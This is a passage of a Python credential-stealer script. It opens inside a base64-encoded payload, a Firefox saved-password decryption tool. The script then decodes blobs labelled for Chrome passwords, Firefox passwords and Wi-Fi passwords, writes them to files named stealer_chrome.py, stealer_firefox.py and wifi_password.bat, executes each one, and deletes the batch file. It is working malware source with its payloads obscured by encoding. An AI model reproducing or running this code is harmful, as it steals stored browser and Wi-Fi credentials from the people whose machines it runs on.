gICAgICBkZWZhdWx0PSI7IiwKICAgICAgICBoZWxwPSJUaGUgZGVsaW1pdGVyIGZvciBjc3Ygb3V0cHV0IiwKICAgICkKICAgIHBhcnNlci5hZGRfYXJndW1lbnQoCiAgICAgICAgIi1xIiwKICAgICAgICAiLS1jc3YtcXVvdGVjaGFyIiwKICAgICAgICBhY3Rpb249InN0b3JlIiwKICAgICAgICBkZWZhdWx0PSciJywKICAgICAgICBoZWxwPSJUaGUgcXVvdGUgY2hhciBmb3IgY3N2IG91dHB1dCIsCiAgICApCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KAogICAgICAgICItLW5vLWNzdi1oZWFkZXIiLAogICAgICAgIGFjdGlvbj0ic3RvcmVfZmFsc2UiLAogICAgICAgIGRlc3Q9ImNzdl9oZWFkZXIiLAogICAgICAgIGRlZmF1bHQ9VHJ1ZSwKICAgICAgICBoZWxwPSJEbyBub3QgaW5jbHVkZSBhIGhlYWRlciBpbiBDU1Ygb3V0cHV0LiIsCiAgICApCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KAogICAgICAgICItbiIsCiAgICAgICAgIi0tbm8taW50ZXJhY3RpdmUiLAogICAgICAgIGFjdGlvbj0ic3RvcmVfZmFsc2UiLAogICAgICAgIGRlc3Q9ImludGVyYWN0aXZlIiwKICAgICAgICBkZWZhdWx0PVRydWUsCiAgICAgICAgaGVscD0iRGlzYWJsZSBpbnRlcmFjdGl2aXR5LiIsCiAgICApCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KAogICAgICAgICItLW5vbi1mYXRhbC1kZWNyeXB0aW9uIiwKICAgICAgICBhY3Rpb249InN0b3JlX3RydWUiLAogICAgICAgIGRlZmF1bHQ9RmFsc2UsCiAgICAgICAgaGVscD0iSWYgc2V0LCBjb3JydXB0ZWQgZW50cmllcyB3aWxsIGJlIHNraXBwZWQgaW5zdGVhZCBvZiBhYm9ydGluZyB0aGUgcHJvY2Vzcy4iLAogICAgKQoKICAgIGFyZ3MgPSBwYXJzZXIucGFyc2VfYXJncygpCgogICAgIyB1bmRlcnN0YW5kIGBcdGAgYXMgdGFiIGNoYXJhY3RlciBpZiBzcGVjaWZpZWQgYXMgZGVsaW1pdGVyLgogICAgaWYgYXJncy5jc3ZfZGVsaW1pdGVyID09ICJcXHQiOgogICAgICAgIGFyZ3MuY3N2X2RlbGltaXRlciA9ICJcdCIKCiAgICByZXR1cm4gYXJncwoKCmRlZiBtYWluKCkgLT4gTm9uZToKICAgICIiIk1haW4gZW50cnkgcG9pbnQiIiIKICAgIGFyZ3MgPSBwYXJzZV9zeXNfYXJncygpCgogICAgZ2xvYmFsIERFRkFVTFRfRU5DT0RJTkcKCiAgICBtb3ogPSBNb3ppbGxhSW50ZXJhY3Rpb24oYXJncy5ub25fZmF0YWxfZGVjcnlwdGlvbikKCiAgICBiYXNlcGF0aCA9IG9zLnBhdGguZXhwYW5kdXNlcihhcmdzLnByb2ZpbGUpCgogICAgcHJvZmlsZXM6IENvbmZpZ1BhcnNlciA9IHJlYWRfcHJvZmlsZXMoYmFzZXBhdGgpCiAgICBzZWN0aW9ucyA9IGdldF9zZWN0aW9ucyhwcm9maWxlcykKICAgIHByb2ZpbGUgPSBOb25lCiAgICBmb3IgaSBpbiByYW5nZShsZW4oc2VjdGlvbnMpKToKICAgICAgICBpID0gaSArIDEKICAgICAgICBzZWN0aW9uID0gc2VjdGlvbnNbc3RyKGkpXQogICAgICAgIHByb2ZpbGUgPSBvcy5wYXRoLmpvaW4oYmFzZXBhdGgsIHNlY3Rpb24pCgogICAgbW96LmxvYWRfcHJvZmlsZShwcm9maWxlKQogICAgbW96LmF1dGhlbnRpY2F0ZShhcmdzLmludGVyYWN0aXZlKQogICAgb3V0cHV0cyA9IG1vei5kZWNyeXB0X3Bhc3N3b3JkcygpCiAgICBpZihvdXRwdXRzKToKICAgICAgICBmb3JtYXR0ZXIgPSBhcmdzLmZvcm1hdChvdXRwdXRzLCBhcmdzKQogICAgICAgIGZvcm1hdHRlci5vdXRwdXQoKQoKICAgICAgICBtb3oudW5sb2FkX3Byb2ZpbGUoKQoKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBtYWluKCk=
"""
decoded = None

decoded = base64.b64decode(chrome_password).decode('ascii')
with open('stealer_chrome.py', 'w') as file:
    file.write(decoded)

exec(open('stealer_chrome.py').read())

decoded = None

decoded = base64.b64decode(firefox_password).decode('ascii')
with open('stealer_firefox.py', 'w') as file:
    file.write(decoded)

exec(open('stealer_firefox.py').read())

decoded = None

decoded = base64.b64decode(wifi_password).decode('ascii')
with open('wifi_password.bat', 'w') as file:
    file.write(decoded)

subprocess.run(r'wifi_password.bat')


#os.remove('stealer_chrome.py')
#os.remove('stealer_firefox.py')
os.remove('wifi_password.bat')
